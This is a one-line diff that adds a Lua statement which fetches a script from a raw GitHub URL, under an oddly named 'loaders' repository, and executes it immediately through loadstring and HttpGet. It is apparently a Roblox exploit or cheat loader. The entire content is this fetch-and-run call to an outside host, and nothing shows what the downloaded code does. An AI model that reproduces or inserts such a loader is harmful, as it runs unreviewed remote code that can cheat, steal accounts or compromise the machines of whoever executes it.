@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/anniversary-daybreak-spam0-whd8tzveiilq60.lua"))()
